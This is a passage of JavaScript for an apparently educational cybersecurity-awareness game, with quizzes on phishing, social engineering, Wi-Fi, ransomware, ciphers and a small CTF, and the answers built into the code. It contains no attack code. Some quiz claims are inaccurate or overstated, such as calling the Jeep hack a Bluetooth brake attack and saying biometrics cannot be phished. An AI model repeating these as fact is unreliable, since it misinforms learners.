        <div class="email-preview" style="white-space:pre-line;margin-top:12px;padding:14px;background:rgba(0,0,0,0.3);border-radius:8px;">${e.body}</div></div>
        <div style="display:flex;gap:12px;margin-top:16px;">
          <button class="cyber-btn green" style="flex:1" onclick="answerPhish(false)">✓ LEGITIMATE</button>
          <button class="cyber-btn pink" style="flex:1" onclick="answerPhish(true)">⚠ PHISHING</button>
        </div></div><div id="phish-fb"></div>`;
  }
  window.answerPhish=function(p){
    const e=emails[cur],ok=p===e.phish; if(ok)score++;
    document.getElementById('phish-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Correct!':'✗ Wrong!'}</h4><p>This is <strong>${e.phish?'PHISHING':'LEGITIMATE'}</strong></p></div>
      <div style="margin-top:12px;"><h3 style="font-size:14px;color:var(--neon-cyan);margin-bottom:8px;">🔍 CLUES:</h3>
      ${e.clues.map(c=>`<div style="padding:3px 0;font-size:13px;color:var(--text-secondary);">• ${c}</div>`).join('')}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextPhish()">NEXT →</button></div>`;
  };
  window.nextPhish=function(){cur++;render();}; render();
}

// ==================== ESCAPE ROOM ====================
function gameEscape(gc){
  const rooms=[
    {name:'RECEPTION',desc:'All systems locked. Lobby shows security alert.',objects:[
      {name:'📋 Visitor Log',id:'log',hint:'Someone signed in as "admin" at 3:47 AM. Very suspicious for a visitor...'},
      {name:'🖥️ Terminal',id:'term',hint:'Sticky note reads: "Temp pw: Welcome2024!" — Never write passwords on sticky notes!'},
      {name:'🔌 USB Drive',id:'usb',hint:'USB labeled "Employee Photos" — classic USB drop attack! Never plug in unknown USBs.'},
      {name:'📱 Phone',id:'phone',hint:'Text says: "Send VPN credentials ASAP" — smishing (SMS phishing)!'}
    ],puzzle:{q:'What time was the suspicious admin login?',a:'3:47'}},
    {name:'SERVER ROOM',desc:'Red warnings flashing. Multiple compromised systems.',objects:[
      {name:'🖥️ Firewall',id:'fw',hint:'10,000+ connections from one IP — brute force attack! Block immediately.'},
      {name:'📊 Monitor',id:'mon',hint:'50GB uploaded to external server at 4 AM — data exfiltration!'},
      {name:'📁 File Share',id:'share',hint:'Permissions: "Everyone - Full Control" — massive misconfiguration!'},
      {name:'💻 Admin PC',id:'pc',hint:'Password is "P@ssw0rd123" — enable MFA immediately!'}
    ],puzzle:{q:'How much data was exfiltrated (just the number)?',a:'50'}},
    {name:'CEO OFFICE',desc:'Targeted attack on executive team. Find the entry point.',objects:[
      {name:'📧 Email',id:'email',hint:'CEO clicked a fake board link — spear phishing attack, highly personalized.'},
      {name:'📅 Calendar',id:'cal',hint:'Attachment "Q4_Report.pdf.exe" — double extension hides an executable!'},
      {name:'🔑 Password Mgr',id:'pw',hint:'Same password for 14 accounts — credential stuffing vulnerability!'},
      {name:'📞 Voicemail',id:'vm',hint:'"IT Support" asked to install remote access — vishing (voice phishing)!'}
    ],puzzle:{q:'What type of phishing targets high-profile individuals?',a:'spear'}}
  ];
  let rIdx=0,found=new Set();
  function render(){
    if(rIdx>=rooms.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🎉 ESCAPED!</h3>
        <div class="result-box success"><h4>Building Secured!</h4><p>You found all evidence and secured the building.</p></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
      addXP(300);markGameComplete('escape');unlockAchievement('escape_artist');return;
    }
    const r=rooms[rIdx];
    gc.innerHTML=`<div class="info-banner"><strong>Room ${rIdx+1}/${rooms.length}:</strong> ${r.name}</div>
      <div class="room-visual"><div class="room-name">${r.name}</div><div class="room-desc">${r.desc}</div>
        <div class="room-objects">${r.objects.map(o=>`<div class="room-object ${found.has(o.id)?'found':''}" onclick="examObj('${o.id}')">${o.name}</div>`).join('')}</div>
      </div><div id="obj-detail"></div>
      <div class="game-panel" id="rpuzzle" style="display:${r.objects.every(o=>found.has(o.id))?'block':'none'}">
        <h3>🔓 PUZZLE</h3><p style="margin-bottom:12px;color:var(--text-secondary);">${r.puzzle.q}</p>
        <div style="display:flex;gap:12px;"><input type="text" class="cyber-input" id="pz-ans" placeholder="Answer..." /><button class="cyber-btn" onclick="submitPz()">SUBMIT</button></div>
        <div id="pz-fb" style="margin-top:8px;"></div></div>`;
  }
  window.examObj=function(id){
    const o=rooms[rIdx].objects.find(x=>x.id===id); if(!o)return; found.add(id);
    document.querySelectorAll('.room-object').forEach(el=>{if(el.textContent.includes(o.name.slice(2)))el.classList.add('found');});
    document.getElementById('obj-detail').innerHTML=`<div class="game-panel slide-up"><h3>🔍 FINDING</h3><div class="terminal-box">${o.hint}</div></div>`;
    if(rooms[rIdx].objects.every(o=>found.has(o.id)))document.getElementById('rpuzzle').style.display='block';
  };
  window.submitPz=function(){
    const a=document.getElementById('pz-ans').value.trim().toLowerCase();
    if(a.includes(rooms[rIdx].puzzle.a.toLowerCase())){rIdx++;render();}
    else document.getElementById('pz-fb').innerHTML='<span style="color:var(--neon-red)">Incorrect. Check evidence.</span>';
  };
  render();
}

// ==================== PRIVACY PROTECTOR ====================
function gamePrivacy(gc){
  const settings=[
    {name:'Share location with all apps',risk:'high',safe:false,why:'Apps track your 24/7 movements. Data sold to advertisers.'},
    {name:'Make social media public',risk:'high',safe:false,why:'Anyone sees your posts, friends, personal info. Enables identity theft.'},
    {name:'Enable two-factor authentication',risk:'low',safe:true,why:'2FA adds critical protection. Even stolen passwords won\'t work alone.'},
    {name:'Share real birthday online',risk:'medium',safe:false,why:'Birthdays are used in security questions. Combined with other info = identity theft.'},
    {name:'Use same password everywhere',risk:'high',safe:false,why:'One breach = ALL accounts compromised via credential stuffing.'},
    {name:'Allow apps to access contacts',risk:'medium',safe:false,why:'Apps harvest contacts for marketing and social engineering.'},
    {name:'Enable automatic updates',risk:'low',safe:true,why:'Updates patch known vulnerabilities. Delays leave you exposed.'},
    {name:'Use VPN on public WiFi',risk:'low',safe:true,why:'VPN encrypts traffic, preventing eavesdropping on open networks.'},
    {name:'Post vacation photos in real-time',risk:'medium',safe:false,why:'Broadcasting you\'re away is an invitation for burglars.'},
    {name:'Accept all cookies',risk:'medium',safe:false,why:'Tracking cookies follow you across the web, building detailed profiles.'},
    {name:'Enable biometric login',risk:'low',safe:true,why:'Biometric auth can\'t be guessed or phished like passwords.'},
    {name:'Allow browser to save passwords',risk:'medium',safe:false,why:'Device access = all passwords exposed. Use a dedicated password manager.'},
  ];
  let answers={},submitted=false;
  gc.innerHTML=`<div class="info-banner"><strong>Mission:</strong> Configure privacy settings. ENABLE safe options, DISABLE risky ones.</div>
    <div class="game-panel"><h3>🔒 PRIVACY SETTINGS</h3>
    ${settings.map((s,i)=>`<div class="privacy-item"><span class="privacy-label">${s.name}</span>
      <span class="privacy-risk risk-${s.risk}">${s.risk}</span>
      <label class="cyber-toggle"><input type="checkbox" id="pc-${i}" onchange="answers[${i}]=this.checked" /><span class="toggle-slider"></span></label></div>`).join('')}
    <button class="cyber-btn" style="margin-top:16px;width:100%;" onclick="submitPriv()">SUBMIT</button></div><div id="priv-res"></div>`;
  window.submitPriv=function(){
    if(submitted)return; submitted=true;
    let correct=0,html='';
    settings.forEach((s,i)=>{const uc=answers[i]||false,ok=uc===s.safe; if(ok)correct++;
      html+=`<div style="padding:12px;background:rgba(0,0,0,0.2);border-radius:8px;margin-bottom:10px;border-left:3px solid ${ok?'var(--neon-green)':'var(--neon-red)'};">
        <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><strong style="font-size:13px;">${s.name}</strong>
        <span style="font-family:var(--font-mono);font-size:11px;color:${ok?'var(--neon-green)':'var(--neon-red)'}">${ok?'✓':'✗'}</span></div>
        <div style="font-size:12px;color:var(--text-secondary);">${s.why}</div></div>`;
    });
    const pct=Math.round(correct/settings.length*100);
    document.getElementById('priv-res').innerHTML=`<div class="game-panel slide-up">
      <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${correct}/${settings.length}</div><div class="score-label">Correct</div></div></div>
      <div class="result-box ${pct>=75?'success':'fail'}"><h4>${pct>=75?'Privacy Pro!':'Room to Improve'}</h4></div>
      <div style="margin-top:20px;">${html}</div>
      <button class="cyber-btn" style="margin-top:16px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
    addXP(200);markGameComplete('privacy');if(pct>=90)unlockAchievement('privacy_shield');
  };
}

// ==================== SOCIAL ENGINEERING ====================
function gameSocial(gc){
  const scenarios=[
    {npc:'Mike from IT 👨‍💻',technique:'Authority & Urgency',msgs:["Hey! Emergency security audit.","I need your login credentials to verify your account.","The CEO authorized this. Share your username and password NOW."],
      opts:[{text:"Sure, my username is jsmith and password is MyP@ss2024",ok:false,fb:"NEVER share credentials! Real IT never asks for passwords."},
        {text:"I'll verify through the official helpdesk first",ok:true,fb:"Always verify through official channels!"},
        {text:"What's your employee ID?",ok:false,fb:"Good instinct but IDs can be faked. Contact IT directly."}]},
    {npc:'Sarah (CEO Assistant) 👩‍💼',technique:'Impersonation',msgs:["The CEO needs an urgent $45,000 wire transfer.","It's confidential — bypass normal approval.","Handle this right away."],
      opts:[{text:"I'll process it right away",ok:false,fb:"Classic Business Email Compromise (BEC)! Always follow financial procedures."},
        {text:"I need to follow standard approval process",ok:true,fb:"Financial procedures exist for this reason. Never bypass them."},
        {text:"Send me the CEO's written authorization",ok:false,fb:"Email authorization can be forged. Follow established procedures."}]},
    {npc:'Delivery Driver 🚚',technique:'Tailgating',msgs:["Got 6 boxes of monitors for 3rd floor.","My hands are full, hold the door? Badge is in my pocket.","I'm here every week — ask anyone!"],
      opts:[{text:"Sure, let me hold the door",ok:false,fb:"Tailgating! Unauthorized physical access leads to data theft and malware."},
        {text:"I'll call reception to verify and escort you",ok:true,fb:"Physical security matters. All visitors must be verified."},
        {text:"Put boxes down and badge yourself in",ok:false,fb:"Better, but stolen/cloned badges exist. Have security verify."}]},
    {npc:'LinkedIn Connection 💼',technique:'Reconnaissance',msgs:["We both went to State University! Small world!","What security tools does your company use?","Who's your CISO? I'd love to invite them to speak."],
      opts:[{text:"We use CrowdStrike! CISO is James Wright",ok:false,fb:"You gave away your security stack, a target name, and email format!"},
        {text:"I can't share security infrastructure details",ok:true,fb:"Never share internal security details with unverified contacts!"},
        {text:"Let me check with my manager",ok:false,fb:"Security infrastructure should never be shared externally, period."}]}
  ];
  let si=0,mi=0,score=0;
  function render(){
    if(si>=scenarios.length){
      const pct=Math.round(score/scenarios.length*100);
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🎭 COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${scenarios.length}</div><div class="score-label">Resisted</div></div></div>
        <div class="result-box ${pct>=75?'success':'fail'}"><h4>${pct>=75?'Expert!':'Stay Vigilant!'}</h4></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
      addXP(250);markGameComplete('social');if(pct>=100)unlockAchievement('social_guard');return;
    }
    const s=scenarios[si];
    gc.innerHTML=`<div class="info-banner"><strong>Scenario ${si+1}/${scenarios.length}:</strong> ${s.technique}</div>
      <div class="game-panel"><div style="font-family:var(--font-display);font-size:13px;margin-bottom:16px;">${s.npc}</div>
      <div class="chat-window" id="sc-chat"></div><div id="sc-acts"></div></div><div id="sc-fb"></div>`;
    mi=0; showMsg();
  }
  function showMsg(){
    const s=scenarios[si];
    if(mi>=s.msgs.length){document.getElementById('sc-acts').innerHTML=`<div class="chat-responses">${s.opts.map((o,i)=>`<button class="chat-response-btn" onclick="socAns(${i})">${o.text}</button>`).join('')}</div>`;return;}
    const chat=document.getElementById('sc-chat'),d=document.createElement('div');d.className='chat-msg npc';
    d.innerHTML=`<div class="chat-bubble">${s.msgs[mi]}</div>`;d.style.opacity='0';d.style.animation='fadeIn 0.4s forwards';
    chat.appendChild(d);chat.scrollTop=chat.scrollHeight;mi++;setTimeout(showMsg,1000);
  }
  window.socAns=function(i){
    const s=scenarios[si],o=s.opts[i]; if(o.ok)score++;
    const chat=document.getElementById('sc-chat'),d=document.createElement('div');d.className='chat-msg user';d.innerHTML=`<div class="chat-bubble">${o.text}</div>`;chat.appendChild(d);
    document.getElementById('sc-acts').innerHTML='';
    document.getElementById('sc-fb').innerHTML=`<div class="game-panel slide-up"><div class="result-box ${o.ok?'success':'fail'}"><h4>${o.ok?'✓ Resisted!':'✗ Manipulated!'}</h4><p>${o.fb}</p></div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextSoc()">NEXT →</button></div>`;
  };
  window.nextSoc=function(){si++;render();}; render();
}

// ==================== FAKE NEWS ====================
function gameFakeNews(gc){
  const items=[
    {text:'Hospital chain hit by ransomware, patient data at risk',real:true,why:'Hospital ransomware attacks are common. Hundreds hit yearly.'},
    {text:'Government secretly installs backdoors in all smartphones',real:false,why:'Conspiracy theory with no evidence. Always check sources.'},
    {text:'Zero-day vulnerability found in popular email client',real:true,why:'Zero-days are found regularly. Bug bounty programs help.'},
    {text:'Hackers can steal data through your smart refrigerator',real:true,why:'IoT devices often have weak security. Update firmware!'},
    {text:'New malware physically destroys CPUs by overheating',real:false,why:'Modern CPUs have thermal protection. Hardware destruction via software is nearly impossible.'},
    {text:'Password manager suffers breach exposing encrypted vaults',real:true,why:'Happened to LastPass in 2022. Use strong master passwords!'},
    {text:'5G towers hack nearby phones to steal banking data',real:false,why:'5G towers can\'t hack phones. Mixes real concerns with misinformation.'},
    {text:'AI deepfake voice used to steal $35 million from a company',real:true,why:'Real 2020 case. Voice cloning scams are a growing threat.'},
    {text:'Antivirus companies create viruses to sell subscriptions',real:false,why:'Popular conspiracy with no evidence. Real threats are plenty.'},
    {text:'Researchers hack a car\'s brakes through Bluetooth',real:true,why:'2015 Jeep Cherokee hack led to 1.4M vehicle recall.'},
  ];
  let cur=0,score=0; const shuffled=[...items].sort(()=>Math.random()-0.5);
  function render(){
    if(cur>=shuffled.length){
      const pct=Math.round(score/shuffled.length*100);
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>📰 COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${shuffled.length}</div><div class="score-label">Correct</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
      addXP(150);markGameComplete('fakenews');if(pct>=90)unlockAchievement('fake_news_killer');return;
    }
    const h=shuffled[cur];
    gc.innerHTML=`<div class="info-banner"><strong>Headline ${cur+1}/${shuffled.length}</strong></div>
      <div class="game-panel" style="text-align:center;"><h3 style="color:var(--text-primary);font-size:18px;line-height:1.5;margin-bottom:24px;">"${h.text}"</h3>
      <div style="display:flex;gap:12px;justify-content:center;">
        <button class="cyber-btn green" onclick="newsAns(true)">✓ REAL</button><button class="cyber-btn pink" onclick="newsAns(false)">✗ FAKE</button></div></div><div id="news-fb"></div>`;
  }
  window.newsAns=function(r){
    const h=shuffled[cur],ok=r===h.real; if(ok)score++;
    document.getElementById('news-fb').innerHTML=`<div class="game-panel slide-up"><div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Correct!':'✗ Wrong!'}</h4>
      <p>This is <strong>${h.real?'REAL':'FAKE'}</strong></p></div>
      <div class="info-banner" style="margin-top:10px;">${h.why}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextNews()">NEXT →</button></div>`;
  };
  window.nextNews=function(){cur++;render();}; render();
}

// ==================== WIFI DANGER ZONE ====================
function gameWifi(gc){
  const nets=[
    {name:'CoffeeShop_Free_WiFi',locked:false,safe:false,why:'Open network. Anyone can intercept your data. Use VPN!'},
    {name:'Starbucks_Official_5G',locked:true,safe:false,why:'Evil Twin attack! Fake network mimicking a real business. Verify with staff.'},
    {name:'ATT-WiFi-8F2A',locked:true,safe:true,why:'Legitimate ISP network with WPA2 encryption.'},
    {name:'FREE_AIRPORT_INTERNET',locked:false,safe:false,why:'Classic honeypot. Real airport WiFi has specific names.'},
    {name:'DIRECT-7F-HP-Printer',locked:true,safe:false,why:'WiFi Direct from printer. IoT devices have vulnerabilities.'},
    {name:'eduroam',locked:true,safe:true,why:'Legitimate worldwide education WiFi with WPA2-Enterprise.'},
    {name:'xfinity-hotspot-2847',locked:true,safe:true,why:'Legitimate ISP hotspot with WPA2 encryption.'},
    {name:'Google Starbucks',locked:false,safe:false,why:'Could easily be spoofed. Anyone can create this network name.'},
  ];
  let ans={},done=false;
  gc.innerHTML=`<div class="info-banner"><strong>Mission:</strong> Classify ${nets.length} networks as SAFE or DANGER.</div>
    <div class="game-panel"><h3>📡 AVAILABLE NETWORKS</h3>
    ${nets.map((n,i)=>`<div class="privacy-item"><div style="flex:1;"><div style="font-family:var(--font-mono);font-size:14px;">${n.locked?'🔒':'🔓'} ${n.name}</div>
      <div style="font-size:11px;color:var(--text-muted);">${n.locked?'WPA2':'Open'}</div></div>
      <div style="display:flex;gap:8px;"><button class="cyber-btn green" style="padding:6px 14px;font-size:10px;" id="ws-${i}" onclick="markW(${i},'safe')">SAFE</button>
      <button class="cyber-btn pink" style="padding:6px 14px;font-size:10px;" id="wd-${i}" onclick="markW(${i},'danger')">DANGER</button></div></div>`).join('')}
    <button class="cyber-btn" style="margin-top:16px;width:100%;" onclick="submitW()">SUBMIT</button></div><div id="wifi-res"></div>`;
  window.markW=function(i,c){ans[i]=c;document.getElementById('ws-'+i).style.opacity=c==='safe'?'1':'0.3';document.getElementById('wd-'+i).style.opacity=c==='danger'?'1':'0.3';};
  window.submitW=function(){
    if(done||Object.keys(ans).length<nets.length)return; done=true;
    let correct=0,html='';
    nets.forEach((n,i)=>{const ok=(ans[i]==='safe')===n.safe; if(ok)correct++;
      html+=`<div style="padding:12px;background:rgba(0,0,0,0.2);border-radius:8px;margin-bottom:10px;border-left:3px solid ${ok?'var(--neon-green)':'var(--neon-red)'};">
        <strong>${n.locked?'🔒':'🔓'} ${n.name}</strong> — <span style="color:${ok?'var(--neon-green)':'var(--neon-red)'}">${ok?'✓':'✗'} ${n.safe?'SAFE':'DANGER'}</span>
        <div style="font-size:12px;color:var(--text-secondary);margin-top:4px;">${n.why}</div></div>`;
    });
    document.getElementById('wifi-res').innerHTML=`<div class="game-panel slide-up">
      <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${correct}/${nets.length}</div><div class="score-label">Correct</div></div></div>
      <div style="margin-top:16px;">${html}</div>
      <button class="cyber-btn" style="margin-top:16px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
    addXP(200);markGameComplete('wifi');if(Math.round(correct/nets.length*100)>=90)unlockAchievement('wifi_warrior');
  };
}

// ==================== RANSOMWARE RESCUE ====================
function gameRansomware(gc){
  const stages=[
    {title:'💀 SYSTEM ENCRYPTED',desc:'All computers show:\n"FILES ENCRYPTED. PAY 5 BITCOIN ($150K) IN 48 HOURS."\n\nYour first move?',
      opts:[{text:'Pay the ransom immediately',ok:false,fb:'Never pay immediately! Only 65% of payers recover data.'},
        {text:'Disconnect all affected systems from the network',ok:true,fb:'Correct! Containment first. Stop the spread.'},
        {text:'Try to decrypt files with online tools',ok:false,fb:'Wastes critical time. Contain first, decrypt later.'}]},
    {title:'🔍 DAMAGE ASSESSMENT',desc:'47 workstations encrypted. Last backup: 3 months ago.\n\nNext critical step?',
      opts:[{text:'Contact law enforcement (FBI/CISA) and incident response team',ok:true,fb:'Yes! They have resources, may have decryption keys.'},
        {text:'Negotiate with attackers for lower ransom',ok:false,fb:'Law enforcement first. They can advise on negotiation.'},
        {text:'Wipe all machines and reinstall',ok:false,fb:'Destroys forensic evidence. Preserve for investigation.'}]},
    {title:'🛡️ INVESTIGATION',desc:'Attacker had access 14 days. Exfiltrated 200GB before encrypting.\n\nThis changes things because:',
      opts:[{text:'This is also a data breach, not just encryption',ok:true,fb:'Double extortion! Even with backups, stolen data may be published.'},
        {text:'We should definitely pay since they have our data',ok:false,fb:'Paying doesn\'t guarantee they won\'t leak. Focus on legal obligations.'},
        {text:'14 days isn\'t that long',ok:false,fb:'14 days = full network mapping, credential theft, backdoors.'}]},
    {title:'🔧 RECOVERY',desc:'3-month-old backup exists. Attackers threaten to publish customer data.\n\nRecommended approach?',
      opts:[{text:'Pay through cyber insurance',ok:false,fb:'Paying funds criminals. Last resort only.'},
        {text:'Restore from backup, accept data loss, notify customers',ok:true,fb:'The right path. Short-term pain prevents funding crime.'},
        {text:'Ignore threats — they won\'t publish',ok:false,fb:'Threat actors frequently follow through.'}]},
    {title:'📋 PREVENTION',desc:'Crisis over. Most important change to prevent recurrence?',
      opts:[{text:'Buy better antivirus',ok:false,fb:'Helps but insufficient alone. Modern ransomware evades AV.'},
        {text:'Regular automated backups with offline/air-gapped copies',ok:true,fb:'Backups are your ultimate safety net. Regular, automated, tested, offline.'},
        {text:'Fire the employee who clicked the email',ok:false,fb:'Counterproductive. Anyone can be phished. Improve training.'}]}
  ];
  let si=0,score=0;
  function render(){
    if(si>=stages.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>💰 CRISIS RESOLVED</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${stages.length}</div><div class="score-label">Correct</div></div></div>
        <div class="info-banner success" style="text-align:left;">
          <strong>Key Takeaways:</strong><br/>1. Contain first<br/>2. Contact law enforcement<br/>3. Preserve evidence<br/>4. Offline backups are #1 defense<br/>5. Don't blame individuals</div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'awareness'})">RETURN</button></div>`;
      addXP(300);markGameComplete('ransomware');if(score>=4)unlockAchievement('ransom_hero');return;
    }
    const s=stages[si];
    gc.innerHTML=`<div class="info-banner warning"><strong>Stage ${si+1}/${stages.length}: ${s.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="margin-bottom:16px;white-space:pre-line;">${s.desc}</div>
      <div class="chat-responses">${s.opts.map((o,i)=>`<button class="chat-response-btn" onclick="ransAns(${i})">${o.text}</button>`).join('')}</div></div><div id="rans-fb"></div>`;
  }
  window.ransAns=function(i){
    const o=stages[si].opts[i]; if(o.ok)score++;
    document.getElementById('rans-fb').innerHTML=`<div class="game-panel slide-up"><div class="result-box ${o.ok?'success':'fail'}"><h4>${o.ok?'✓ Good!':'✗ Not Ideal'}</h4><p>${o.fb}</p></div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextRans()">CONTINUE →</button></div>`;
  };
  window.nextRans=function(){si++;render();}; render();
}

// ==================== CIPHER CHALLENGE ====================
function gameCipher(gc){
  const challenges=[
    {name:'Caesar Cipher (Shift 3)',hint:'A→D, B→E, etc.',cipher:'FUBHU VHFXULWB',answer:'CYBER SECURITY',type:'caesar',
      explain:'Caesar cipher shifts each letter by a fixed number. Named after Julius Caesar who used shift-3 for military messages.'},
    {name:'Binary to ASCII',hint:'Each 8 bits = 1 character',cipher:'01001000 01000001 01000011 01001011',answer:'HACK',type:'binary',
      explain:'Computers store everything as binary (0s and 1s). ASCII maps numbers 0-127 to characters.'},
    {name:'Hex to ASCII',hint:'Each pair of hex digits = 1 character',cipher:'43 54 46',answer:'CTF',type:'hex',
      explain:'Hexadecimal (base-16) is compact binary. Used in memory addresses, color codes, and malware analysis.'},
    {name:'Base64 Decode',hint:'Base64 uses A-Z, a-z, 0-9, +, /',cipher:'U2VjdXJl',answer:'SECURE',type:'base64',
      explain:'Base64 encodes binary data as printable ASCII. Used in email attachments, web tokens (JWT), data URLs.'},
    {name:'Reverse Cipher',hint:'Read it backwards',cipher:'NOIT PYRCED',answer:'DECRYPTION',type:'reverse',
      explain:'Simple substitution. Often combined with other ciphers for obfuscation.'},
    {name:'Atbash Cipher',hint:'A↔Z, B↔Y, C↔X...',cipher:'HZUV',answer:'SAFE',type:'atbash',
      explain:'Hebrew cipher where the alphabet is reversed. A=Z, B=Y. Used in ancient texts.'},
    {name:'ROT13',hint:'Rotate alphabet 13 positions. A↔N, B↔O...',cipher:'FRPHER',answer:'SECURE',type:'rot13',
      explain:'ROT13 is Caesar cipher with shift 13. Applying it twice returns original text. Used to hide spoilers online.'},
    {name:'Morse Code',hint:'... = S, --- = O',cipher:'... --- ...',answer:'SOS',type:'morse',
      explain:'Morse code encodes characters as dots and dashes. Still used in aviation and emergency signals.'},
  ];
  let ci=0,score=0;
  function render(){
    if(ci>=challenges.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🔐 COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${challenges.length}</div><div class="score-label">Decoded</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(200);markGameComplete('cipher');if(score>=6)unlockAchievement('cipher_master');return;
    }
    const ch=challenges[ci];
    gc.innerHTML=`<div class="info-banner"><strong>Challenge ${ci+1}/${challenges.length}: ${ch.name}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="margin-bottom:16px;text-align:center;font-size:20px;letter-spacing:3px;">${ch.cipher}</div>
        <div style="margin-bottom:16px;"><strong>💡 Hint:</strong> <span style="color:var(--text-secondary);">${ch.hint}</span></div>
        <div style="display:flex;gap:12px;"><input type="text" class="cyber-input" id="ci-ans" placeholder="Decoded text..." />
        <button class="cyber-btn" onclick="checkCi()">DECODE</button></div></div><div id="ci-fb"></div>`;
  }
  window.checkCi=function(){
    const ch=challenges[ci],a=document.getElementById('ci-ans').value.trim().toUpperCase(),ok=a===ch.answer;
    if(ok)score++;
    document.getElementById('ci-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Decoded!':'✗ Not Quite'}</h4><p>Answer: <strong>${ch.answer}</strong></p></div>
      <div class="info-banner" style="margin-top:10px;">${ch.explain}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextCi()">NEXT →</button></div>`;
  };
  window.nextCi=function(){ci++;render();}; render();
}

// ==================== CODE BREAKER ====================
function gameCodebreaker(gc){
  const puzzles=[
    {title:'Pattern Lock',desc:'The password follows a pattern: A1B2C3_?_',hint:'Each letter is followed by its position in the alphabet',answer:'D4',
      explain:'Pattern recognition is key in cryptanalysis. Attackers look for patterns in encrypted data.'},
    {title:'Hash Match',desc:'Match the hash type:\n5d41402abc4b2a76b9719d911017c592',hint:'32 hex characters. Most common hash.',answer:'MD5',
      explain:'MD5 produces 128-bit (32 hex char) hashes. Considered broken — use SHA-256 or bcrypt.'},
    {title:'Timestamp Decode',desc:'Convert Unix timestamp to find the year:\n1609459200',hint:'Seconds since Jan 1, 1970',answer:'2021',
      explain:'Unix time counts seconds from epoch (Jan 1, 1970). Used in logs, tokens, and forensics.'},
    {title:'JWT Token',desc:'A JWT header says: {"alg":"none","typ":"JWT"}\nWhat vulnerability?',hint:'The algorithm field...',answer:'NONE',
      explain:'Setting alg=none bypasses signature verification. Always validate JWT algorithms server-side!'},
    {title:'Port Identification',desc:'What service typically runs on port 22?',hint:'Secure remote access',answer:'SSH',
      explain:'SSH (Secure Shell) on port 22. Know common ports: 80=HTTP, 443=HTTPS, 21=FTP, 3306=MySQL.'},
    {title:'Hash Crack',desc:'You found: 5f4dcc3b5aa765d61d8327deb882cf99\nThis is the MD5 of one of the most common passwords.',hint:'What\'s the most commonly used password?',answer:'PASSWORD',
      explain:'Rainbow tables map common passwords to their hashes. Salting prevents precomputed attacks.'},
  ];
  let pi=0,score=0;
  function render(){
    if(pi>=puzzles.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>💻 COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${puzzles.length}</div><div class="score-label">Cracked</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(250);markGameComplete('codebreaker');if(score>=5)unlockAchievement('code_cracker');return;
    }
    const p=puzzles[pi];
    gc.innerHTML=`<div class="info-banner"><strong>Puzzle ${pi+1}/${puzzles.length}: ${p.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="white-space:pre-line;margin-bottom:16px;">${p.desc}</div>
        <div style="margin-bottom:16px;"><strong>💡 Hint:</strong> <span style="color:var(--text-secondary);">${p.hint}</span></div>
        <div style="display:flex;gap:12px;"><input type="text" class="cyber-input" id="cb-ans" placeholder="Your answer..." />
        <button class="cyber-btn" onclick="checkCB()">SUBMIT</button></div></div><div id="cb-fb"></div>`;
  }
  window.checkCB=function(){
    const p=puzzles[pi],a=document.getElementById('cb-ans').value.trim().toUpperCase(),ok=a===p.answer;
    if(ok)score++;
    document.getElementById('cb-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Cracked!':'✗ Not Quite'}</h4><p>Answer: <strong>${p.answer}</strong></p></div>
      <div class="info-banner" style="margin-top:10px;">${p.explain}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextCB()">NEXT →</button></div>`;
  };
  window.nextCB=function(){pi++;render();}; render();
}

// ==================== MINI CTF ====================
function gameCTF(gc){
  const flags=[
    {title:'Hidden in Plain Sight',desc:'Examine this message:\nThe flag is not here. Or is it?\n<!-- FLAG{HTML_COMMENTS_HIDE_SECRETS} -->',
      hint:'View source code...',answer:'FLAG{HTML_COMMENTS_HIDE_SECRETS}',explain:'Always check HTML source, comments, and hidden elements during CTFs.'},
    {title:'Base64 Flag',desc:'Decode: RkxBR3tCQVNFNjRfSVNfTk9UX0VOQ1JZUFRJT059',
